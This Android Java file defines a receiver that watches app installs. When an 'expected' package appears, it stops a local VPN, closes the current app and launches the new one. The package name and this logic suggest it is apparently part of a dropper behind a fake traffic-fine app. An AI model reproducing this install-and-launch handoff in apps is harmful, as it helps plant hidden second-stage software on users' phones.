package com.service.rtochallan_v;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import java.util.Objects;

public class InstallReceiver extends BroadcastReceiver {

    private Helper helper;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction())) {
            helper = new Helper(context);
            String installedPackage = Objects.requireNonNull(intent.getData()).getSchemeSpecificPart();
            String expectedPackage = helper.getApkPackageName();
            helper.show( "📦 Installed: " + installedPackage + " | Expected: " + expectedPackage);
            if (installedPackage.equals(expectedPackage)) {
                helper.show( "✅ Matched package detected — stopping VPN and restarting...");
                helper.stopLocalVpn();
                helper.closeApp();
                helper.openApp(installedPackage);
            }
        }
    }

}
